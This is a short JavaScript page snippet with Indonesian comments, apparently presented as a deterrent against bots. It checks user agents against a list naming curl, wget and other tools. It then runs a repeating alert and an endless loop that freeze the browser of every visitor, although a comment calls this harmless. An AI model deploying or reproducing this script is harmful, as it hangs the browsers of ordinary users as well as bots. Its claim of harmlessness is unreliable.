(function () {
    // Deteksi siapa yang akses
    const userAgent = navigator.userAgent.toLowerCase();
    const suspiciousAgents = ["curl", "wget", "python", "java", "scanner"]; // Deteksi bot/crawler

    // Kalau mereka pake tool mencurigakan, kasih reaksi
    suspiciousAgents.forEach((agent) => {
        if (userAgent.includes(agent)) {
            // Redirect mereka ke neraka
            window.location.href = "https://127.0.0.1"; // Localhost lock
        }
    });

    // Bikin mereka ngerasain browser crash loop
    setInterval(() => {
        alert("WARNING: Access Denied! Jangan Sentuh Halaman Ini Lagi.");
    }, 1000);

    // Buat nge-lag browser (opsional, gak bahaya)
    while (true) {
        console.log("You're not welcome here."); // Endless loop buat flood console
    }
})();